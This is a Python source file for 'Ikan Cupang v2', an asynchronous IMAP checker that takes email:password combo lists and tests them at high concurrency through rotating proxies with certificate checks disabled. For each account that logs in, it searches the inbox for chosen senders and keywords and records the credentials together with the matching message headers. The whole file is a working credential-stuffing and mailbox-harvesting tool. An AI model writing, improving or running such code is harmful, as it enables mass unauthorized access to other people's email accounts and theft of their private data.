#!/usr/bin/env python3
"""
fast_checker.py - Ikan Cupang v2 Ultra-Fast IMAP Checker
High-concurrency async IMAP engine capable of checking 6,000+ accounts in ~10 seconds.
Uses raw asyncio TLS streams, DNS caching, and non-blocking buffered file logging.
"""

import asyncio
import os
import sys
import time
import json
import ssl
import re
import socket
import argparse
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List, Set, Tuple

EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')

# Global reusable SSL context (skips cert verification overhead)
_GLOBAL_SSL_CTX = ssl.create_default_context()
_GLOBAL_SSL_CTX.check_hostname = False
_GLOBAL_SSL_CTX.verify_mode = ssl.CERT_NONE

# In-memory DNS cache: hostname -> IP string
_DNS_CACHE: Dict[str, str] = {}


def _escape_imap_str(s: str) -> bytes:
    """Escape IMAP string for quoted argument."""
    escaped = s.replace('\\', '\\\\').replace('"', '\\"')
    return f'"{escaped}"'.encode('utf-8', errors='replace')


def _decode_header_words(raw_val: str) -> str:
    """Decode RFC 2047 encoded-word strings in headers."""
    import email.header
    try:
        decoded_parts = email.header.decode_header(raw_val)
        out = []
        for content, encoding in decoded_parts:
            if isinstance(content, bytes):
                enc = encoding or 'utf-8'
                try:
                    out.append(content.decode(enc, errors='replace'))
                except Exception:
                    out.append(content.decode('latin1', errors='replace'))
            else:
                out.append(str(content))
        return "".join(out)
    except Exception:
        return raw_val


def _subject_excluded(subject: str, patterns: List[str]) -> bool:
    """Return True if subject matches any exclusion pattern."""
    if not subject or not patterns:
        return False
    s_lower = subject.lower()
    return any(p.lower() in s_lower for p in patterns)


def format_live_report_entry(email_addr: str, password: str, emails_found: List[Dict[str, str]], search_since_date: str) -> str:
    """Format live account report with ASCII table matching v1."""
    if not emails_found:
        return f"[+] Account: {email_addr}:{password}\n"

    num_w, date_w, from_w, subj_w = 3, 18, 30, 45
    header = f"    | {'No.':<{num_w}} | {'Date':<{date_w}} | {'From':<{from_w}} | {'Subject':<{subj_w}} |"
    sep = f"    |{'-'*num_w}-|-{'-'*date_w}-|-{'-'*from_w}-|-{'-'*subj_w}-|"
    lines = [
        f"[+] Account: {email_addr}:{password}",
        f"    Ditemukan {len(emails_found)} email target sejak {search_since_date}:",
        header,
        sep,
    ]
    for i, info in enumerate(emails_found, 1):
        d = str(info.get('date', ''))
        if len(d) > date_w:
            d = d[:date_w - 3] + "..."
        f_addr = str(info.get('from', ''))
        if len(f_addr) > from_w:
            f_addr = f_addr[:from_w - 3] + "..."
        s = str(info.get('subject', ''))
        if len(s) > subj_w:
            s = s[:subj_w - 3] + "..."
        lines.append(f"    | {str(i):<{num_w}} | {d:<{date_w}} | {f_addr:<{from_w}} | {s:<{subj_w}} |")
    lines.append(sep)
    lines.append("")
    return "\n".join(lines)


class FastImapEngine:
    def __init__(
        self,
        accounts: List[Dict[str, str]],
        imap_configs: Dict[str, Any],
        output_dir: str,
        concurrency: int = 1000,
        timeout: float = 4.0,
        target_senders: Optional[List[str]] = None,
        keywords: Optional[List[str]] = None,
        search_days: int = 365,
        skip_domains: Optional[List[str]] = None,
        unusable_domains: Optional[Set[str]] = None,
        already_accounts: Optional[Set[str]] = None,
        proxies: Optional[List[Dict[str, Any]]] = None,
        subject_exclusion_patterns: Optional[List[str]] = None,
        on_progress: Optional[Any] = None,
        on_live: Optional[Any] = None,
    ):
        self.accounts = accounts
        self.total = len(accounts)
        self.imap_configs = imap_configs
        self.output_dir = output_dir
        self.concurrency = max(1, concurrency)
        self.timeout = timeout
        self.target_senders = target_senders or []
        self.keywords = keywords or []
        self.search_days = search_days
        self.skip_domains = [s.lower() for s in (skip_domains or [])]
        self.unusable_domains = unusable_domains or set()
        self.already_accounts = already_accounts or set()
        self.proxies = proxies or []
        if subject_exclusion_patterns is not None:
            self.subject_exclusion_patterns = subject_exclusion_patterns
        else:
            p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "subject_exclusion_list.json")
            self.subject_exclusion_patterns = load_json_file(p) or []
        self.on_progress = on_progress
        self.on_live = on_live
        self._proxy_idx = 0

        self.search_since = (datetime.now() - timedelta(days=search_days)).strftime('%d-%b-%Y')
        os.makedirs(self.output_dir, exist_ok=True)

        # Output file paths
        self.live_file = os.path.join(self.output_dir, "live.txt")
        self.noemail_file = os.path.join(self.output_dir, "noemail.txt")
        self.die_file = os.path.join(self.output_dir, "die.txt")
        self.unreg_file = os.path.join(self.output_dir, "unreg.txt")
        self.skip_file = os.path.join(self.output_dir, "domain_skipped.txt")
        self.already_file = os.path.join(self.output_dir, "already.txt")

        # Stats counters
        self.checked = 0
        self.live_count = 0
        self.noemail_count = 0
        self.die_count = 0
        self.unreg_count = 0
        self.skipped_count = 0
        self.already_count = 0

        # Discovered server cache: domain -> config
        self._runtime_resolved_domains: Dict[str, Any] = {}
        self._unreg_domains_set: Set[str] = set()

        # Write queue for zero-contention asynchronous flushing
        self.write_queue = asyncio.Queue()
        self.stop_event = asyncio.Event()

    def _get_proxy(self) -> Optional[Dict[str, Any]]:
        if not self.proxies:
            return None
        p = self.proxies[self._proxy_idx % len(self.proxies)]
        self._proxy_idx += 1
        return p

    async def _resolve_ip(self, host: str) -> Optional[str]:
        """Resolve host to IP with in-memory caching."""
        if host in _DNS_CACHE:
            return _DNS_CACHE[host]
        loop = asyncio.get_running_loop()
        try:
            addrinfo = await asyncio.wait_for(
                loop.getaddrinfo(host, None, family=socket.AF_INET, type=socket.SOCK_STREAM),
                timeout=1.5
            )
            if addrinfo:
                ip = str(addrinfo[0][4][0])
                _DNS_CACHE[host] = ip
                return ip
        except Exception:
            pass
        return None

    def _lookup_domain_config(self, domain: str) -> Optional[Dict[str, Any]]:
        """Instant in-memory domain config lookup."""
        if domain in self._runtime_resolved_domains:
            return self._runtime_resolved_domains[domain]
        if domain in self.imap_configs:
            return self.imap_configs[domain]

        # Check parent domain
        parts = domain.split(".")
        if len(parts) > 2:
            parent = ".".join(parts[-2:])
            if parent in self.imap_configs:
                return self.imap_configs[parent]
            if len(parts) > 3:
                grandparent = ".".join(parts[-3:])
                if grandparent in self.imap_configs:
                    return self.imap_configs[grandparent]
        return None

    async def _probe_domain_imap(self, domain: str) -> Optional[Dict[str, Any]]:
        """Quick probe for unknown domain: checks imap.domain and mail.domain."""
        if domain in self._unreg_domains_set:
            return None

        candidates = [f"imap.{domain}", f"mail.{domain}", domain]
        for host in candidates:
            ip = await self._resolve_ip(host)
            if not ip:
                continue
            # Try port 993 SSL
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, 993, ssl=_GLOBAL_SSL_CTX, server_hostname=host),
                    timeout=2.0
                )
                banner = await asyncio.wait_for(reader.readline(), timeout=1.5)
                writer.close()
                await writer.wait_closed()
                if b"* OK" in banner.upper():
                    cfg = {"server": host, "port": 993, "ssl": True}
                    self._runtime_resolved_domains[domain] = cfg
                    return cfg
            except Exception:
                pass

            # Try port 143 Plain fallback
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, 143),
                    timeout=1.5
                )
                banner = await asyncio.wait_for(reader.readline(), timeout=1.5)
                writer.close()
                await writer.wait_closed()
                if b"* OK" in banner.upper():
                    cfg = {"server": host, "port": 143, "ssl": False}
                    self._runtime_resolved_domains[domain] = cfg
                    return cfg
            except Exception:
                pass

        self._unreg_domains_set.add(domain)
        return None

    async def _connect_imap(self, server: str, port: int, use_ssl: bool, proxy: Optional[Dict[str, Any]] = None):
        """High-speed raw socket connect with optional HTTP proxy."""
        ip = await self._resolve_ip(server)
        target_ip = ip or server

        if proxy:
            # HTTP CONNECT Tunnel
            p_host = proxy["host"]
            p_port = int(proxy["port"])
            p_ip = await self._resolve_ip(p_host) or p_host
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(p_ip, p_port),
                timeout=self.timeout
            )
            connect_req = f"CONNECT {server}:{port} HTTP/1.1\r\nHost: {server}:{port}\r\n"
            if proxy.get("user") and proxy.get("pass"):
                import base64
                creds = base64.b64encode(f"{proxy['user']}:{proxy['pass']}".encode()).decode()
                connect_req += f"Proxy-Authorization: Basic {creds}\r\n"
            connect_req += "\r\n"
            writer.write(connect_req.encode())
            await writer.drain()

            resp = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=self.timeout)
            if b" 200 " not in resp.split(b"\r\n")[0]:
                writer.close()
                raise ConnectionError("Proxy CONNECT failed")

            if use_ssl:
                loop = asyncio.get_running_loop()
                protocol = writer.transport.get_protocol()
                new_trans = await loop.start_tls(writer.transport, protocol, _GLOBAL_SSL_CTX, server_hostname=server)
                setattr(writer, "_transport", new_trans)
            return reader, writer
        else:
            # Direct connection
            ssl_ctx = _GLOBAL_SSL_CTX if use_ssl else None
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target_ip, port, ssl=ssl_ctx, server_hostname=server if use_ssl else None),
                timeout=self.timeout
            )
            return reader, writer

    async def _fetch_headers_for_ids(self, reader, writer, ids: List[str]) -> List[Dict[str, str]]:
        """Fetch Subject, From, Date headers for matched message IDs."""
        results = []
        import email as _email
        import email.utils
        tag_counter = 50
        for eid in ids:
            tag = f"AF{tag_counter}".encode()
            tag_counter += 1
            cmd = f"{tag.decode()} FETCH {eid} (BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])\r\n".encode()
            try:
                writer.write(cmd)
                await writer.drain()
                header_bytes = b""
                while True:
                    line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                    if not line:
                        break
                    if line.startswith(tag):
                        break
                    m = re.search(rb'\{(\d+)\}\r?\n?$', line)
                    if m:
                        length = int(m.group(1))
                        data = await asyncio.wait_for(reader.readexactly(length), timeout=self.timeout)
                        header_bytes += data

                if header_bytes:
                    msg = _email.message_from_bytes(header_bytes)
                    subj = _decode_header_words(msg.get("Subject", ""))
                    from_raw = _decode_header_words(msg.get("From", ""))
                    _name, from_addr = email.utils.parseaddr(from_raw)
                    date_raw = _decode_header_words(msg.get("Date", ""))
                    try:
                        dt = email.utils.parsedate_to_datetime(date_raw)
                        fmt_date = dt.strftime('%d-%b-%Y %H:%M')
                    except Exception:
                        fmt_date = date_raw

                    results.append({
                        "subject": subj,
                        "from": from_addr or from_raw,
                        "date": fmt_date,
                    })
            except Exception:
                pass
        return results

    async def _check_single_account(self, sem: asyncio.Semaphore, account: Dict[str, str]):
        """Check one account through raw IMAP."""
        async with sem:
            if self.stop_event.is_set():
                return

            email_addr = account["email"]
            password = account["password"]
            combo = f"{email_addr}:{password}"
            lower_email = email_addr.lower()
            domain = lower_email.split("@")[-1]

            # 1. Check already verified
            if self.already_accounts and f"{lower_email}:{password.strip()}" in self.already_accounts:
                self.already_count += 1
                self.checked += 1
                await self.write_queue.put(("already", combo))
                if self.on_progress:
                    self.on_progress("already")
                return

            # 2. Check skip domains
            if any(k in domain for k in self.skip_domains):
                self.skipped_count += 1
                self.checked += 1
                await self.write_queue.put(("skip", combo))
                if self.on_progress:
                    self.on_progress("skip")
                return

            # 3. Check unusable domains
            if domain in self.unusable_domains:
                self.skipped_count += 1
                self.checked += 1
                await self.write_queue.put(("skip", combo))
                if self.on_progress:
                    self.on_progress("skip")
                return

            # 4. Lookup / Probe config
            cfg = self._lookup_domain_config(domain)
            if not cfg:
                cfg = await self._probe_domain_imap(domain)
            if not cfg:
                self.unreg_count += 1
                self.checked += 1
                await self.write_queue.put(("unreg", domain))
                if self.on_progress:
                    self.on_progress("unreg")
                return

            server = str(cfg.get("server", ""))
            port = int(cfg.get("port", 993))
            use_ssl = cfg.get("ssl", (port == 993))
            proxy = self._get_proxy()

            reader = None
            writer = None
            banner = None
            try:
                reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
                banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                if not banner or not (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
                    raise ConnectionError("Invalid greeting banner")
            except Exception:
                if writer:
                    try:
                        writer.close()
                    except Exception:
                        pass
                # Dual-port fallback (993 SSL <-> 143 Plain)
                alt_port = 143 if port == 993 else 993
                alt_ssl = (alt_port == 993)
                try:
                    reader, writer = await self._connect_imap(server, alt_port, alt_ssl, proxy)
                    banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                    if banner and (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
                        port = alt_port
                        use_ssl = alt_ssl
                    else:
                        raise ConnectionError("Invalid fallback greeting")
                except Exception:
                    self.die_count += 1
                    self.checked += 1
                    await self.write_queue.put(("die", combo))
                    if self.on_progress:
                        self.on_progress("die")
                    return

            try:
                # STARTTLS upgrade if plain connection and required/supported
                if not use_ssl and b"STARTTLS" in banner.upper() and b"LOGINDISABLED" in banner.upper():
                    writer.write(b"A0 STARTTLS\r\n")
                    await writer.drain()
                    st_resp = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                    if st_resp.upper().startswith(b"A0 OK"):
                        loop = asyncio.get_running_loop()
                        protocol = writer.transport.get_protocol()
                        new_trans = await loop.start_tls(writer.transport, protocol, _GLOBAL_SSL_CTX, server_hostname=server)
                        setattr(writer, "_transport", new_trans)

                # Send LOGIN
                cmd = b"A1 LOGIN " + _escape_imap_str(email_addr) + b" " + _escape_imap_str(password) + b"\r\n"
                writer.write(cmd)
                await writer.drain()

                # Read response until tagged line
                is_live = False
                while True:
                    line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                    if not line:
                        break
                    u = line.upper()
                    if u.startswith(b"A1 OK"):
                        is_live = True
                        break
                    elif u.startswith(b"A1 NO") or u.startswith(b"A1 BAD"):
                        is_live = False
                        break

                if not is_live:
                    self.die_count += 1
                    self.checked += 1
                    await self.write_queue.put(("die", combo))
                    if self.on_progress:
                        self.on_progress("die")
                    writer.write(b"A9 LOGOUT\r\n")
                    await writer.drain()
                    return

                # LIVE account!
                # If pure empass mode (no criteria or explicit "*")
                is_pure_empass = (self.target_senders == ["*"]) or (not self.target_senders and not self.keywords)
                if is_pure_empass:
                    self.live_count += 1
                    self.checked += 1
                    await self.write_queue.put(("live", f"[+] Account: {email_addr}:{password}"))
                    if self.on_live:
                        self.on_live({"account": email_addr, "password": password, "email_count": 0, "emails": []})
                    if self.on_progress:
                        self.on_progress("live")
                    writer.write(b"A9 LOGOUT\r\n")
                    await writer.drain()
                    return

                # Search requested: SELECT INBOX
                writer.write(b"A2 SELECT INBOX\r\n")
                await writer.drain()
                inbox_ok = False
                while True:
                    line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                    if not line:
                        break
                    if line.upper().startswith(b"A2 OK"):
                        inbox_ok = True
                        break
                    elif line.upper().startswith(b"A2 NO") or line.upper().startswith(b"A2 BAD"):
                        break

                if not inbox_ok:
                    self.noemail_count += 1
                    self.checked += 1
                    await self.write_queue.put(("noemail", combo))
                    if self.on_progress:
                        self.on_progress("noemail")
                    writer.write(b"A9 LOGOUT\r\n")
                    await writer.drain()
                    return

                # Search by sender / keyword
                matching_ids = set()
                tag_idx = 3

                # Search target senders
                for sender in self.target_senders:
                    if sender == "*":
                        continue
                    tag = f"A{tag_idx}".encode()
                    tag_idx += 1
                    clean_s = sender.lstrip("@") if sender.startswith("@") else sender
                    crit = f'{tag.decode()} SEARCH SINCE {self.search_since} FROM "{clean_s}"\r\n'
                    writer.write(crit.encode())
                    await writer.drain()
                    while True:
                        line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                        if not line:
                            break
                        if line.startswith(b"* SEARCH"):
                            parts = line.split()[2:]
                            matching_ids.update(parts)
                        if line.startswith(tag):
                            break

                # Search keywords
                for kw in self.keywords:
                    tag = f"A{tag_idx}".encode()
                    tag_idx += 1
                    crit = f'{tag.decode()} SEARCH SINCE {self.search_since} SUBJECT "{kw}"\r\n'
                    writer.write(crit.encode())
                    await writer.drain()
                    while True:
                        line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
                        if not line:
                            break
                        if line.startswith(b"* SEARCH"):
                            parts = line.split()[2:]
                            matching_ids.update(parts)
                        if line.startswith(tag):
                            break

                emails_data = []
                if matching_ids:
                    # Fetch details for up to 20 newest matching IDs
                    valid_ids = [x.decode() if isinstance(x, bytes) else str(x) for x in matching_ids]
                    sorted_ids = sorted([x for x in valid_ids if x.isdigit()], key=int)[-20:]
                    sorted_ids.reverse()

                    raw_emails = await self._fetch_headers_for_ids(reader, writer, sorted_ids)
                    emails_data = [
                        em for em in raw_emails
                        if not _subject_excluded(em.get("subject", ""), self.subject_exclusion_patterns)
                    ]

                if emails_data:
                    self.live_count += 1
                    self.checked += 1
                    report_entry = format_live_report_entry(email_addr, password, emails_data, self.search_since)
                    await self.write_queue.put(("live", report_entry))
                    if self.on_live:
                        self.on_live({
                            "account": email_addr,
                            "password": password,
                            "email_count": len(emails_data),
                            "emails": emails_data
                        })
                    if self.on_progress:
                        self.on_progress("live")
                else:
                    self.noemail_count += 1
                    self.checked += 1
                    await self.write_queue.put(("noemail", combo))
                    if self.on_progress:
                        self.on_progress("noemail")

                writer.write(b"A9 LOGOUT\r\n")
                await writer.drain()

            except Exception:
                self.die_count += 1
                self.checked += 1
                await self.write_queue.put(("die", combo))
                if self.on_progress:
                    self.on_progress("die")
            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

    async def _writer_worker(self):
        """Batch file writer consuming from async queue."""
        buffers: Dict[str, List[str]] = {
            "live": [],
            "noemail": [],
            "die": [],
            "unreg": [],
            "skip": [],
            "already": [],
        }
        file_map = {
            "live": self.live_file,
            "noemail": self.noemail_file,
            "die": self.die_file,
            "unreg": self.unreg_file,
            "skip": self.skip_file,
            "already": self.already_file,
        }

        last_flush = time.monotonic()

        while not self.stop_event.is_set() or not self.write_queue.empty():
            try:
                cat, data = await asyncio.wait_for(self.write_queue.get(), timeout=0.2)
                if cat in buffers:
                    buffers[cat].append(data)
                self.write_queue.task_done()
            except asyncio.TimeoutError:
                pass

            now = time.monotonic()
            if now - last_flush > 0.5 or any(len(buf) >= 100 for buf in buffers.values()):
                for cat, items in buffers.items():
                    if items:
                        target = file_map[cat]
                        text = "\n".join(items) + "\n"
                        with open(target, "a", encoding="utf-8", errors="replace") as f:
                            f.write(text)
                        items.clear()
                last_flush = now

        # Final flush
        for cat, items in buffers.items():
            if items:
                target = file_map[cat]
                text = "\n".join(items) + "\n"
                with open(target, "a", encoding="utf-8", errors="replace") as f:
                    f.write(text)
                items.clear()

    async def run(self, silent: bool = False):
        """Execute all checks with live terminal reporting."""
        sem = asyncio.Semaphore(self.concurrency)
        writer_task = asyncio.create_task(self._writer_worker())

        t_start = time.monotonic()
        tasks = [asyncio.create_task(self._check_single_account(sem, acc)) for acc in self.accounts]

        # Live terminal progress updater
        while not all(t.done() for t in tasks):
            await asyncio.sleep(0.1)
            if not silent:
                elapsed = time.monotonic() - t_start
                speed = self.checked / elapsed if elapsed > 0 else 0
                pct = (self.checked / self.total * 100) if self.total > 0 else 0
                sys.stdout.write(
                    f"\r\033[K[\033[96m{self.checked:,}/{self.total:,}\033[0m | \033[92m{pct:5.1f}%\033[0m] "
                    f"[\033[93m{speed:6.1f} req/s\033[0m] "
                    f"Live: \033[92m{self.live_count:,}\033[0m | "
                    f"Die: \033[91m{self.die_count:,}\033[0m | "
                    f"NoEmail: \033[94m{self.noemail_count:,}\033[0m | "
                    f"Unreg: \033[33m{self.unreg_count:,}\033[0m | "
                    f"Skip: {self.skipped_count:,}"
                )
                sys.stdout.flush()

        await asyncio.gather(*tasks, return_exceptions=True)
        self.stop_event.set()
        await writer_task

        if not silent:
            t_total = time.monotonic() - t_start
            speed = self.checked / t_total if t_total > 0 else 0
            sys.stdout.write(
                f"\r\033[K[\033[92mCOMPLETE\033[0m] Checked \033[96m{self.checked:,}\033[0m in \033[92m{t_total:.2f}s\033[0m "
                f"(\033[93m{speed:.1f} req/s\033[0m)\n"
                f"  [+] Live: {self.live_count:,}\n"
                f"  [-] Die: {self.die_count:,}\n"
                f"  [o] NoEmail: {self.noemail_count:,}\n"
                f"  [?] Unreg: {self.unreg_count:,}\n"
                f"  [x] Skipped: {self.skipped_count:,}\n"
                f"  [=] Already: {self.already_count:,}\n"
                f"  Output saved to: {self.output_dir}\n"
            )
            sys.stdout.flush()


def load_json_file(path: str) -> Any:
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return None


def parse_accounts_file(path: str) -> List[Dict[str, str]]:
    accounts = []
    seen = set()
    f = sys.stdin if path == "-" else open(path, "r", encoding="utf-8", errors="replace")
    try:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or ":" not in line:
                continue
            parts = line.split(":", 1)
            em, pw = parts[0].strip(), parts[1].strip()
            if not EMAIL_REGEX.match(em):
                continue
            k = em.lower()
            if k in seen:
                continue
            seen.add(k)
            accounts.append({"email": em, "password": pw})
    finally:
        if path != "-":
            f.close()
    return accounts


def main():
    parser = argparse.ArgumentParser(description="Ikan Cupang v2 — Ultra-Fast Asynchronous IMAP Checker")
    parser.add_argument("input", help="Accounts file (email:password per line) or '-' for stdin")
    parser.add_argument("-c", "--concurrency", type=int, default=1000, help="Concurrency level (default: 1000)")
    parser.add_argument("-t", "--timeout", type=float, default=4.0, help="Timeout per check in seconds (default: 4.0)")
    parser.add_argument("-o", "--output-dir", default=None, help="Output directory (default: results_YYYYMMDD_HHMMSS)")
    parser.add_argument("-s", "--senders", help="Target senders file or comma-separated list")
    parser.add_argument("-k", "--keywords", help="Target keywords file or comma-separated list")
    parser.add_argument("--days", type=int, default=365, help="Search since days ago (default: 365)")
    args = parser.parse_args()

    project_root = os.path.dirname(os.path.abspath(__file__))

    # Load databases
    config_path = os.path.join(project_root, "imap_config.json")
    imap_configs = load_json_file(config_path) or {}

    skip_path = os.path.join(project_root, "skip_domains.json")
    skip_domains = load_json_file(skip_path) or []

    unusable_path = os.path.join(project_root, "imap_unusable.json")
    unusable_domains = set(load_json_file(unusable_path) or [])

    already_path = os.path.join(project_root, "already_accounts.txt")
    already_accounts = set()
    if os.path.exists(already_path):
        with open(already_path, "r", encoding="utf-8", errors="replace") as f:
            for l in f:
                l = l.strip()
                if l and not l.startswith("#"):
                    already_accounts.add(l.lower())

    accounts = parse_accounts_file(args.input)
    if not accounts:
        print("[!] No valid accounts parsed from input.")
        sys.exit(1)

    output_dir = args.output_dir or f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    target_senders = []
    if args.senders:
        if os.path.isfile(args.senders):
            with open(args.senders, "r", encoding="utf-8") as f:
                target_senders = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        else:
            target_senders = [s.strip() for s in args.senders.split(",") if s.strip()]

    keywords = []
    if args.keywords:
        if os.path.isfile(args.keywords):
            with open(args.keywords, "r", encoding="utf-8") as f:
                keywords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        else:
            keywords = [k.strip() for k in args.keywords.split(",") if k.strip()]

    print(f"[*] Ikan Cupang v2 Loaded: {len(accounts):,} unique accounts | {len(imap_configs):,} domain configs")
    print(f"[*] Concurrency: {args.concurrency} | Timeout: {args.timeout}s | Output: {output_dir}")

    engine = FastImapEngine(
        accounts=accounts,
        imap_configs=imap_configs,
        output_dir=output_dir,
        concurrency=args.concurrency,
        timeout=args.timeout,
        target_senders=target_senders,
        keywords=keywords,
        search_days=args.days,
        skip_domains=skip_domains,
        unusable_domains=unusable_domains,
        already_accounts=already_accounts,
    )

    asyncio.run(engine.run())


if __name__ == "__main__":
    main()
